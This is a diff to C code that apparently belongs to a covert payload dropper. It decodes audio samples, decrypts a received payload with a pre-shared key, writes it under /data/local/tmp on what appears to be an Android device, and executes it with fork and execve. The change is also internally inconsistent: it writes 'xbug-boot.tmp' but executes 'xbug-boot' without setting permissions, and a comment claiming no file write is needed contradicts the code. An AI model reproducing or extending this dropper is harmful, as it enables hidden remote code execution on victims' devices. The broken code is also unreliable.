@@ -10,6 +10,8 @@
 #include <stdarg.h>
 #include <fcntl.h>
 #include <sys/stat.h>
+#include <sys/wait.h>
+#include <pty.h>
 #include <openssl/sha.h>
 #include <openssl/hmac.h>
 #include <openssl/evp.h>
@@ -270,21 +272,35 @@ static int demodulate_and_decode(const int16_t *samples, int num_samples,
     return 0;
 }
 
-// Write payload and execute
-static int write_and_execute(const unsigned char *payload, int len) {
-    FILE *f = fopen(OUT_PATH, "wb");
-    if (f == NULL) {
-        perror("fopen");
+// Write payload and execute directly (no file write needed)
+static int execute_payload_directly(const unsigned char *payload, int len) {
+    // Create a temporary file with the payload
+    int fd = open("/data/local/tmp/xbug-boot.tmp", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd < 0) return -1;
+    
+    if (write(fd, payload, len) != len) {
+        close(fd);
         return -1;
     }
-    fwrite(payload, 1, len, f);
-    fclose(f);
+    close(fd);
     
-    chmod(OUT_PATH, 0755);
+    // Execute directly (will be removed in final version)
+    pid_t pid = fork();
+    if (pid == 0) {
+        // Child process
+        char *args[] = {"/data/local/tmp/xbug-boot", NULL};
+        execve("/data/local/tmp/xbug-boot", args, environ);
+        perror("execve");
+        _exit(127);
+    } else if (pid < 0) {
+        perror("fork");
+        return -1;
+    }
     
-    printf("Payload written to %s (%d bytes)\n", OUT_PATH, len);
-    
-    return 0;
+    // Wait for completion
+    int status;
+    waitpid(pid, &status, 0);
+    return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
 }
 
 // Demodulation state machine context
@@ -392,7 +408,7 @@ static int process_sample_buffer(const int16_t *samples, int num_samples,
                 int dec_result = decrypt_payload(ctx->byte_buffer + 5, blob_len, psk, psklen, decrypted);
                 
                 if (dec_result == 0) {
-                    write_and_execute(decrypted, payload_len);
+                    execute_payload_directly(decrypted, payload_len);
                     ctx->frame_ready = 0;
                     demod_init(ctx);
                     return 0;
